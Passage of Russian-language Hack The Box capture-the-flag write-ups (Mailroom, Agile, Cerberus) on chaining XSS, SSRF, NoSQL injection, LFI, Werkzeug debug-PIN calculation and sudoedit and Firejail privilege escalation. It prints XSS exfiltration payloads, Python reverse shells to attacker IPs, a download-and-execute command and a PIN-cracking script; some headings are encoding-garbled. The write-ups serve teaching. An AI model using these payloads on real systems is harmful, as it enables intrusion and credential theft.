Те перь декоди руем строку Base64, записы ваем в файл и открываем через
браузер. Нас встре чает форма авто ризации сайта.





                    Фор ма авторизации


XSS + SSRF + NoSQL Injection
Вводимые логин и пароль отправляют ся на страницу auth.php, исходный код
которой мы можем пос мотреть в репозитории. Так мы опре деляем, что
используется NoSQL СУБД MongoDB. Заодно узнаем, что полученные зна-
чения не проверяются, а это напрямую ведет к NoSQL-инъ екции.





                    Исходный код auth.php

Пе репи шем наг рузку, что бы она отправляла логин и пароль, получа ла ответ
от сервера и отправляла его на наш веб-сервер. В ито ге получаем сооб-
щение о том, что логин и пароль невалидны.


var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php',
true);
xhr.setRequestHeader('Content-type', 'application/
x-www-form-urlencoded');
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
       fetch("http://10.10.14.119/?" + encodeURI(btoa(this.
responseText)));
   }
};
xhr.send("email=ralf123@ralf.com&password=ralf123");



                        Ответ сервера

А теперь попробуем проэксплуати ровать NoSQL-инъекцию. К при меру, если
к имени пользователя добавить [$ne], то вместе с символами = база данных
вос при мет это как оператор «не равно». А зна чит, следующий зап рос с неп-
равильными име нем поль зователя и паролем пройдет про верку и вернет нам
другой ответ.


var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php',
true);
xhr.setRequestHeader('Content-type', 'application/
x-www-form-urlencoded');
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
       fetch("http://10.10.14.119/?" + encodeURI(btoa(this.
responseText)));
   }
};
xhr.send("email[$ne]=toto&password[$ne]=toto");




                        Ответ сервера

В отве те сказано, что используется двухфакторная аутентификация и код
отправ лен на поч товый ящик. Таким обра зом мы получа ем ответ, к которому
нуж но стремиться, и можем посим вольно переб рать сна чала логин, а затем
и пароль. Для перебо ра первого парамет ра будем использовать сле дующий
запрос.


<script>var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php',
true);
xhr.setRequestHeader('Content-type', 'application/
x-www-form-urlencoded');
xhr.onreadystatechange = function() {
       if (xhr.readyState == XMLHttpRequest.DONE) {
               if (/"success":true/.test(this.responseText)) {
                       fetch("http://10.10.14.119/a");
               }
       }
}
xhr.send("email[$regex]=.*a@mailroom.htb&password[$ne]=toto");
</script>

Пос ледовательность email[$regex]=.* здесь говорит срав нить при помощи
регулярного выраже ния имя пользователя с любым количеством любых сим-
волов. Но идея в том, что бы под ставлять в конец регулярного выраже ния
символ (в при мере используем a) — проверка будет пройдена и нагрузка
выполнит зап рос толь ко тогда, ког да имя поль зователя будет оканчиваться
таким символом. Узнав последний символ имени пользователя, будем
получать предпоследний и так далее до пер вого. Для перебора сим волов я
использую Burp Intruder с задержкой 30 секунд между запросами.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

Спустя несколь ко минут в логах нашего веб-сервера видим запрос с желан-
ным символом.





                      Ло ги веб-сервера

Пос ледний символ име ни пользователя — n, а значит, мы идем в верном нап-
равле нии и будем перебирать предпоследний. Для этого меня ем запрос
в Burp Intruder, запускаем перебор и наблюдаем за логами веб-сервера.





                      Ло ги веб-сервера

По лучили предпоследний символ. Переби рая далее, доходим до момента,
когда имя поль зовате ля ни с одним новым символом не ини циирует запрос,
а имя пользовате ля все равно не подходит.




                      Ло ги веб-сервера

Тогда убираем из запроса регулярное выраже ние и подбираем последний
символ обычным сканиро ванием (место перебора отме чено как $$).


xhr.send("email=$$ristan@mailroom.htb&password[$ne]=toto");





                      Ло ги веб-сервера

По лучаем имя поль зователя, которого находи ли среди пользовате лей Gitea.
Теперь будем перебирать пароль. Так как в пароле могут использовать ся
не толь ко буквы и циф ры, но и любые символы, то первым делом под берем
его дли ну — тоже в Burp Intruder.


xhr.send("email=tristan@mailroom.htb&password[$regex]=.{1}");
...
xhr.send("email=tristan@mailroom.htb&password[$regex]=.{20}");





                      Ло ги веб-сервера

По лучаем дли ну пароля, а теперь уже использованным способом переби-
раем и пароль.


xhr.send("email=tristan@mailroom.htb&password[$regex]=.*$$");




                      Ло ги веб-сервера

У нас есть имя поль зователя и пароль. Пробуем применить их на всех дос-
тупных сер висах и авто ризуемся на SSH.




                      Сессия пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




          ЭКСПЛУАТИРУЕМ NOSQL-ИНЪЕКЦИЮ ЧЕРЕЗ
                ЦЕПОЧКУ УЯЗВИМОСТЕЙ XSS И SSRF





ÏÐÎÄÂÈÆÅÍÈÅ
Ñëóæáà www-data
Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Во-первых, находим файл KeePass.




                    Спи сок файлов KeePass

Во-вто рых, в домашнем каталоге пользователя matthew обнаруживаем поль-
зователя .kpcli-history.





          Фай лы рута в дру гих пользователь ских каталогах

Также пом ним про внут ренний сайт, к которо му мы получали доступ через
XSS. Поработаем с этим сайтом, для чего прокинем порт на свой хост через
SSH.


ssh -i id_rsa tristan@mailroom.htb -L 80:127.0.0.1:80

Таким образом весь трафик, который мы пошлем на локальный порт 80, будет
туннелирован на порт 80 указанного хос та (в дан ном случае 127.0.0.1) через
SSH-хост. Обновим запись в файле /etc/hosts и откроем сайт.


127.0.0.1 staff-review-panel.mailroom.htb





                    Страница авториза ции сайта

Авторизуемся с получен ными ранее учетными дан ными и видим сообщение,
что токен для двух фактор ной аутентифика ции отправлен на почту.





                     Со общение о 2FA

Вхо дящие сообщения в Linux находят ся в каталоге /var/mail. Получаем
ссылку с токеном для авторизации и заходим на сайт.


cat /var/mail/tristan





                Со общения поль зователя tristan





                        Главная стра ница сай та

Те перь можем вер нуться к функции shell_exec, которую мы уже отмечали.
Фун кция выпол няет переданную ей коман ду в командной оболочке.





                   Исходный код inspect.php

Поль зовательский ввод подвергается пред варительной филь трации, но сре-
ди представ ленных символов отсутству ет сим вол косой кавычки. Строка
в таких кавычках будет воспринимать ся командным интерпретатором как вло-
женная команда, резуль тат которой нуж но вставить в основную. Значит, эта
коман да будет выполнена первой.
  Запускаем веб-сер вер:


python3 -m http.server 88

И для теста пытаемся обратиться к нему с удаленного хоста.


curl http://10.10.14.71:88/test_rce





                  Выпол нение команды curl





                      Ло ги веб-сервера

Ко ман да выполнена, а значит, запус каем листенер:


pwncat-cs -lp 4321

А так же записы ваем в файл на своем веб-сервере реверс-шелл на Python.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.71",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty; pty.spawn("sh")'

А теперь ска чиваем этот скрипт на уда ленном хос те, назначаем права
и выполняем.


curl http://10.10.14.71:88/rs.sh -o /tmp/rs.sh
chmod +x /tmp/rs.sh
/tmp/rs.sh





                  Сессия поль зователя www-data


Ïîëüçîâàòåëü matthew
В исходниках сайта есть каталог .git. Мы зна ем, что исполь зуется сервис
Gitea, а значит, в файле config могут быть учетные данные для этой системы.





                  Со держимое катало га сайта





                 Содержимое фай ла .git/cong

По лучаем учетные дан ные пользователя matthew и пробуем авторизо ваться
с ними в системе. Так мы меняем сессию и получа ем первый файл — user.
txt.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Мы уже видели файлы .kpcli и консольную утилиту для работы с менеджером
паролей KeePass. Давай проверим про цес сы пользователей: есть шанс, что
программа запуще на в системе.





                 Процессы поль зователя matthew

Так и есть. Значит, мы можем попробовать отладить процесс и получить дос-
туп к важным данным и даже сохраненным паролям пользовате ля. Для этого
извле чем PID процесса и отпра вим отладчику ptrace.


ptrace ` ps -elf | grep -v 'pts' | awk '/kpcli/{print $4}'`





                     Ло ги отладчика ptrace

Отладчик  перехватит  вывод  сообщения,  предлагающего  наз вать  мас-
тер-пароль. Сохраним весь вывод в файл и отфильтру ем из него только
вызов функции read, с помощью которой должен быть считан пароль.





                    Вызовы функции read

В логе видим проскакивающие иног да печатаемые сим волы. Усилим фильтр,
чтобы выводить толь ко момент считывания таких символов.





                  Считанные программой сим волы

И перех ватываем вве денную стро ку: !sEcUr3p4$$w0rd9. Это, видимо, и есть
мастер-пароль. Теперь открываем файл в KeePass и получа ем рутовый
пароль, с которым можем авто ризовать ся в системе.





                Расшифро ванная база данных KeePass





                           Флаг рута

Машина захвачена!
ВЗЛОМ





     ЛОМАЕМ PIN К ВЕБ-КОНСОЛИ
           FLASK WERKZEUG





В этом райтапе я разберу атаку на веб-кон-
соль Flask Werkzeug, работу с удален ным
отладчиком Chrome и покажу, как экс плу-
атировать    нашумевшую     уязвимость
в sudoedit для чтения произвольных файлов             RalfHacker                                                                                             hackerralf8@gmail.com
в системе.


По может мне в этом тренировочная машина Agile с площадки Hack The Box.
Уровень ее сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.203    agile.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел все го два откры тых порта: 22 — служ ба OpenSSH 8.9p1 и 80 —
веб-сервер Nginx 1.18.0. Как обычно в такой ситуации, сразу идем смот реть
веб.





                       Главная страница agile.htb

Нас встре чает стартовая страница Nginx, а это значит, что основной сайт рас-
положен либо в другом катало ге, либо на дру гом домене. Попробу ем его
най ти, для это го прос канируем катало ги с помощью feroxbuster .




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования.




feroxbuster -u http://10.10.11.203/ -w directory_2.3_medium_
lowercase.txt -d 2 -t 256



                 Ре зультат сканиро вания катало гов

В результате сканирования находим редирект на домен superpass.htb.
Добав ляем его в файл /etc/hosts и про веряем.


10.10.11.203 agile.htb superpass.htb





                  Главная страница сай та superpass.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
На сай те есть возможность зарегистрировать ся и авторизоваться. Сделаем
это, что бы рас ширить область тестирования.





                    Фор ма авторизации

Те перь нам дос тупен онлай новый сервис для хранения учетных данных.





                          Стра ница vault

Нам нужно протестировать мак симально возможное число функций сервиса.
Создаем тестовую запись и экспортируем пароли.





                        Экспорт паролей

Файл ска чивается автомати чески, прос мотрим весь процесс в Burp History.





                             Burp History

Имя файла для  скачивания передается  в парамет ре fn на  странице
download. Сто ит проверить, мож но ли выполнить обход каталога и получить
другой про изволь ный файл.





                Со держимое файла /etc/passwd

По лучаем содержимое фай ла /etc/passwd, а это значит, что на сайте есть
уязвимость LFI.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




               ЛОМАЕМ PIN К ВЕБ-КОНСОЛИ FLASK
                                  WERKZEUG





ÒÎ×ÊÀ ÎÏÎÐÛ
LFI
Первым делом,  когда обна руживаем  LFI, нуж но проверить все фай лы,
которые могут содержать инте ресную информацию. На GitHub можно най ти
много таких сло варей, а перебирать по ним будем с помощью Burp Intruder.





                 Burp Intruder — вкладка Payload positions

В результате ничего осо бенного не нашли, только из фай ла /etc/passwd
узнаем о наличии тестовой версии сайта на домене test.superpass.htb,
а также получим переменные окружения про цес са из файла /proc/self/
environ.





                 Содержимое фай ла /etc/hosts





              Со держимое файла /proc/self/environ

Пе ременные окружения рас крыли нам пользовате ля www-data, от имени
которого работа ет сер вис. Интересна и переменная CONFIG_PATH, где указан
файл настро ек /app/config_prod.json. Но при попытке прочитать его
получаем ошиб ку Bad Request.





            Зап рос на загрузку файла /app/cong_prod.json

Иногда при отображении ошибок при ложе ние может рас кры вать пути к фай-
лам, в которых про изошла ошибка. Поэто му попробуем ска чать несущес тву-
ющий файл /etc/qweqweqwe.txt.





             Зап рос на заг рузку фай ла /etc/qweqweqwe.txt

При ложе ние пре дос тавило большой вывод, в котором и присутству ет путь
к исполняемо му фай лу сайта:


/app/app/superpass/views/vault_views.py





                Со держимое файла vault_views.py

Моей пер вой идеей было получить SECRET_KEY от Flask, чтобы можно было
вруч ную  генерировать  идентифика торы  сессии  других  пользователей
и получать сохраненные пароли. Но в этом слу чае секретный ключ Flask
не был явно задан.


Flask Werkzeug
При регистрации и авто ризации мож но добиться ошибки Flask, что дает нам
воз можность зап росить дебаг-кон соль Werkzeug. Но проблема в том, что она
защище на девятизначным PIN-кодом.





                  Страница ошибки Flask Werkzeug





                        Консоль Werkzeug

Тут нам и при годит ся уязвимость LFI, так как, имея доступ к некоторым
парамет рам системы, можно рас счи тать PIN с помощью скрипта из статьи
Бена Грю эла. Часть параметров у нас уже есть:
 • имя поль зовате ля, от имени которого работа ет при ложе ние, — www-data;
 • название модуля — обычно flask.app или werkzeug.debug;
 • название  приложения —  тоже  берем  из  скрипта  wsgi_app,
   это DebuggedApplication или Flask;
 • путь  к  при ложению  Flask —  /app/venv/lib/python3.10/site-
  packages/flask/app.py .

Еще два необходимых значения — MAC-адрес и идентификатор системы.
Первый  параметр  получаем  из фай ла  /sys/class/net/eth0/address,
а затем перево дим в десятеричный формат: 345052368982.





           Содер жимое фай ла /sys/class/net/eth0/address





                   Преобразованное значение

Что бы получить вто рой недос тающий параметр, нам нужно объ единить зна-
чения из файлов /etc/machine-id и /proc/self/cgroup:


ed5b159560f54721827644bc9b220d00superpass.service





               Содержимое файла /etc/machine-id





              Содержимое файла /proc/self/cgroup

Те перь  исполь зуем  перечисленные  зна чения  в  следующем  скрипте
для получе ния всех воз можных вариантов PIN-кода.


import hashlib
import itertools
from itertools import chain


def crack_md5(username, modname, appname, flaskapp_path, node_uuid,
machine_id):
   h = hashlib.md5()
   crack(h, username, modname, appname, flaskapp_path, node_uuid,
machine_id)


def crack_sha1(username, modname, appname, flaskapp_path, node_uuid,
machine_id):
   h = hashlib.sha1()
   crack(h, username, modname, appname, flaskapp_path, node_uuid,
machine_id)


def crack(hasher, username, modname, appname, flaskapp_path,
node_uuid, machine_id):
   probably_public_bits = [
           username,
           modname,
           appname,
           flaskapp_path ]
   private_bits = [
           node_uuid,
           machine_id ]


   h = hasher
   for bit in chain(probably_public_bits, private_bits):
       if not bit:
           continue
       if isinstance(bit, str):
           bit = bit.encode('utf-8')
       h.update(bit)
   h.update(b'cookiesalt')


   cookie_name = '__wzd' + h.hexdigest()[:20]


   num = None
   if num is None:
       h.update(b'pinsalt')
       num = ('%09d' % int(h.hexdigest(), 16))[:9]


   rv =None
   if rv is None:
       for group_size in 5, 4, 3:
           if len(num) % group_size == 0:
               rv = '-'.join(num[x:x + group_size].rjust(group_size,
'0')
                             for x in range(0, len(num), group_size))
               break
       else:
           rv = num


   print(rv)


if __name__ == '__main__':
   usernames = ['www-data']
   modnames = ['flask.app', 'werkzeug.debug']
   appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
   flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.
py']
   nodeuuids = ['345052368982']
   machineids = ['ed5b159560f54721827644bc9b220d00superpass.service']


   combinations = itertools.product(usernames, modnames, appnames,
flaskpaths, nodeuuids, machineids)


   for combo in combinations:
       username, modname, appname, flaskpath, nodeuuid, machineid =
combo
       print('=========')
       crack_sha1(username, modname, appname, flaskpath, nodeuuid,
machineid)
       print(f'{combo}')
       print('=========')





                    Резуль тат работы скрипта

Первый сгенери рованный PIN дает доступ к кон соли Python 3, откуда мы лег-
ко получа ем системный шелл.


__import__('os').popen('id').read();





                        Консоль Werkzeug

Те перь используем следующий реверс-шелл Python 3, который поймаем
на листенер pwncat -lp 4321.


import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.54",4321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")





                  Сессия поль зователя www-data




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




               ЛОМАЕМ PIN К ВЕБ-КОНСОЛИ FLASK
                                  WERKZEUG





ÏÐÎÄÂÈÆÅÍÈÅ
Ïîëüçîâàòåëü corum
Наше приложе ние использует базу дан ных, а значит, ско рее всего, и пароли
тоже хранит в ней. Попробуем найти учетные дан ные для под ключения к БД.





        По иск подстроки MySQL в исходных кодах при ложе ния

В исходниках ничего найти не уда лось, но это не проб лема, так как у нас есть
доступ к консоли отладчика приложения. Сна чала най дем главный файл при-
ложения app.py в модуле wsgi_app.




                Модуль wsgi_app в отладчи ке

Открываем  кон соль  и  получаем  из  конфига  параметры  SECRET_KEY
и SQL_URI. Вто рой содержит учетные данные для подключения к базе.





                Парамет ры SECRET_KEY и SQL_URI

Те перь подключаем ся к базе данных и заходим в таблицу superpass.


mysql -h localhost -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK'
use superpass;





                   Подключение к базе дан ных

И получаем таб лицы из базы superpass.


show tables;





                      Таблицы в базе superpass

Нам интересна таб лица passwords. Смот рим, что в ней.


select * from passwords;





                   Данные в таблице passwords

Строки из стол бца password непохожи на хеши, поэтому попробуем исполь-
зовать их как пароли и переберем при авториза ции по SSH от имени поль-
зователя corum.





                       Флаг пользователя

Флаг пользователя — у нас!


Ïîëüçîâàòåëü edwards
Что бы повысить при вилегии, нужно первым делом собрать информа цию. Я,
как обыч но, при бегну к скрип там PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Смотрим, что нашел скрипт, и отмечаем для себя важ ную информацию.
  В спис ке процессов — Google Chrome с активированной удаленной
отладкой на порте 41829.





                     Дерево процессов

Из списка откры тых портов определяем, что порт 41829 доступен только
для обращения с локального хоста.





                    Спи сок откры тых пор тов

Сре ди  пос ледних модифицированных файлов  в  сис теме  присутс твует
какой-то пакет поль зовательских скриптов activate.





               Последние модифи цированные фай лы

Это дает нам вектор атаки. Если у Google Chrome активна удаленная отладка,
зна чит, можно с помощью другого браузера Chrome подключиться к порту
отладчика и получать все доступные данные. Это поз волит как бы «подсмат-
ривать» за поль зовате лем. Но первым делом орга низуем SSH-туннель так,
чтобы весь трафик, который мы пош лем на локальный порт 41829, был тун-
нелиро ван на порт 41829 указанного хоста (в дан ном случае 127.0.0.1) через
SSH.


ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829 -N

Когда туннель готов, можно приступать к нас трой ке браузе ра. В строке поис-
ка перехо дим на страницу chrome://inspect и в графе Discover network
targets добав ляем запись localhost:41829.





                Настройки для разработ чиков Chrome





                     Добавление хос та

Когда поль зователь зайдет на любую стра ницу, мы увидим информа цию
об этом. К примеру, в данном слу чае пользователь зашел на страницу
http://test.superpass.htb.





                  Информация о подключениях

Выбираем inspect и получаем ту же страницу, что отобража ется у поль-
зователя.





                    Отладчик Google Chrome

Так мы получаем новые учетные данные, с которы ми можно авторизоваться
в системе от имени поль зователя edwards.





                   Сессия нового поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Разведку на хос те уже проводи ли, а со сменой кон текста работы в Linux мало
что меняется. Но все же некоторые вещи нуж но проверить заново. Одна
из них — настрой ки sudoers.


sudo -l





                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Видим, что наш пользователь может запустить команды sudoedit  /app/
config_test.json  и  sudoedit  /app/app-testing/tests/functional/
creds.txt от име ни поль зователя и группы dev_admin. А члены этой группы
могут записы вать в недавно обнаруженный файл /app/venv/bin/activate,
который периодичес ки выполняет ся в системе от име ни рута.




                Права на файл /app/venv/bin/activate

В sudoedit есть извес тная уязвимость CVE-2023-22809, под робнее можешь
про читать о ней в отчете Synacktiv (PDF). С помощью этой уязвимос ти мы
сможем выпол нить команду  в  кон тексте sudo  от име ни пользователя
dev_admin. Это дает нам воз можность дописать свой код в файл /app/venv/
bin/activate, чтобы запустить что угодно в при вилегированном контексте.
Выпол ним команду nano -- /app/venv/bin/activate:


export EDITOR="nano -- /app/venv/bin/activate"
sudo -u dev_admin sudoedit /app/config_test.json





                  Эксплуатация уяз вимос ти sudoedit

Те перь открываем файл в nano и дописываем код: chmod u+s /bin/bash. Он
наз начит S-бит фай лу командной оболочки /bin/bash.





                     Редактирова ние фай ла





                   Провер ка успешной записи

Ждем некоторое время, пери одичес ки проверяя права на файл /bin/bash.
Как только заметим выставлен ный S-бит, получаем привилегированную сес-
сию.



                     Права на файл /bin/bash


/bin/bash -p





                           Флаг рута

Машина захвачена!
ВЗЛОМ





      ЗАХВАТЫВАЕМ КОНТРОЛЛЕР
     ДОМЕНА WINDOWS ЧЕРЕЗ БАГ
             SAML SSO





В этом райтапе я покажу, как эксплуати-
ровать уязвимость в сервисе ADSelfService
Plus для захвата домена Active  Directory.
По дороге захватим хост на Linux, раскрутив
цепоч ку уязвимос тей в системе мониторин-             RalfHacker                                                                                             hackerralf8@gmail.com
га Icinga Web 2. Повысим привиле гии бла-
годаря дыре в сендбоксе Firejail и сдампим
учетные дан ные из SSSD.


По может нам в этом тренировочная машина Cerberus с площад ки Hack
The Box. Уровень — сложный.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.205    cerberus.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел все го один откры тый порт! Это порт 8080, на котором работает
веб-сервер Apache 2.4.52. При этом в заголов ке http-title сразу отоб-
ражен редирект на домен icinga.cerberus.local, который мы добавляем
в файл /etc/hosts.


10.10.11.205 cerberus.htb icinga.cerberus.local cerberus.local

Те перь перехо дим по этому адресу в бра узере, и нас встречает опенсор сная
система монито рин га Icinga Web 2.





             Форма авто ризации icinga.cerberus.local


ÒÎ×ÊÀ ÂÕÎÄÀ
Первым делом нуж но поискать существующие эксплоиты для найденной сис-
темы. Мне удалось вый ти на блог, где описаны уяз вимос ти для Icinga Web 2.
И первое, что прив лекает внимание, — это баг, позволяющий читать про-
извольные файлы на хос те.





          Описание уязвимос ти чтения произвольных фай лов

Пробуем указанным в описании способом прочитать файл /etc/hosts.


http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-
thirdparty/etc/hosts





                 Содержимое фай ла /etc/hosts

Но одно дело — иметь такую возможность, а дру гое — знать, какие файлы
читать. В этом поможет до кументация Icinga, где мож но посмотреть имена
и описание файлов с нас тройками. Первый интересный файл — это confing.
ini. Он содержит глобальные настрой ки, к при меру путь к файлам модулей.


http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-
thirdparty/etc/icingaweb2/config.ini





                 Со держимое файла cong.ini

Второй инте ресный файл — resources.ini. В нем записаны учетные данные
для под клю чения к базе данных.


http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-
thirdparty/etc/icingaweb2/resources.ini





                Содержимое файла resources.ini

С эти ми учетными данными получается авто ризо ваться на сайте.





                        Главная страница Icinga


ÒÎ×ÊÀ ÎÏÎÐÛ
Те перь у нас есть доступ к сайту, и мож но перей ти к другой опи санной в том
же ресер че уязвимости CVE-2022-24715. Аутентифицированные пользовате-
ли с доступом к настройкам фреймворка могут создавать фай лы ресурсов
SSH в непредусмотренных катало гах, что приводит к выпол нению произволь-
ного кода. Уязвимость зак люча ется в неп равиль ной проверке переданной
строки в коде на PHP. Если использовать null-байт, то при проверке он будет
учтен и строка получится обрезан ной, но в момент записи в файл null-байт
не будет учитываться, что приведет к записи дополнительных данных.





                     Описание уязвимос ти

Пе ред тем как пытаться воспро извести эти дей ствия вручную, можно пос-
мотреть, нет ли в интерне те готового кода, который автоматизирует этот
сложный процесс. Пер вая ссылка на GitHub при водит к рабочему экс плоиту.
Но прежде чем пускать его в ход, мы должны сге нерировать SSH-ключ.


ssh-keygen -t rsa -m pem

Пос ле это го запускаем лис тенер:


pwncat-cs -lp 4321

И выпол няем файл экс плоита:


python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/
-I 10.10.14.75 -P 4321 -u matthew -p IcingaWebPassword2023 -e id_rsa





                  Резуль тат выполнения эксплоита

Моментально на листенере появляется сес сия от имени пользователя www-
data.





                      Сессия в pwncat-cs




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




               ЗАХВАТЫВАЕМ КОНТРОЛЛЕР ДОМЕНА
                   WINDOWS ЧЕРЕЗ БАГ SAML SSO





ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ (ÕÎÑÒ 1)
Те перь нам нуж но собрать информацию о сис теме. Я буду использовать
для это го скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


В выводе много информации, поэто му отберем только значимую.
  На хосте есть необходимые для выпол нения кода библиотеки MySQL.





                    Связанные с MySQL данные

Сре ди фай лов с уста новленным битом SUID есть неизвес тный бинарь
firejail.





               Фай лы с выставленным битом SUID

Информация о сетевом интерфейсе раскрывает адрес сети — 172.16.22.0.





               Информация о сетевом интерфейсе

В дереве про цессов находим работа ющий SSSD — демон для управления
доступом к службам каталогов и механизмам про верки под линнос ти.



                     Дерево процессов

Также отме чаем SSSD сре ди профилей AppArmor.





                      Профили AppArmor

На  хос те  при сутствует файл  /etc/krb5.conf,  содержащий  настрой ки
Kerberos для работы в домене.





                Со держимое файла /etc/krb5.conf

Информации, конеч но, мно го, но наиболее здесь важно, что у бинарного
файла firejail есть бит SUID.




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.


Firejail — это система изолиро ванного выполнения графических, консольных
и серверных при ложений, которая снижает риск наруше ния безопас ности
за счет ограниче ния рабочей среды потенциально уязвимых программ.
Для это го исполь зуют ся пространства имен, фильтра ция системных вызовов
и воз можности AppArmor.
  В  таких  случаях  нуж но  обязательно  проверить  техники  GTFOBins
или существующие эксплоиты, так как главная задача — просто получить неп-
редумыш ленное выполнение кода. Быстрый поиск эксплоитов в Google
показал, что это верный путь.





                   По иск экспло итов в Google

Первая же ссылка приводит к рабочему эксплоиту, который я и использовал.
Единственное неудобство — для эксплуатации нам нужно сде лать еще одну
сессию. Тогда в первой сессии мы запус каем эксплоит, а во второй исполь-
зуем Firejail для получения привилегиро ванного шел ла.



              Пер вая сессия — выпол нение эксплоита


firejail --join=35256





         Вто рая сес сия — получение привилегированного шел ла


ÏÐÎÄÂÈÆÅÍÈÅ
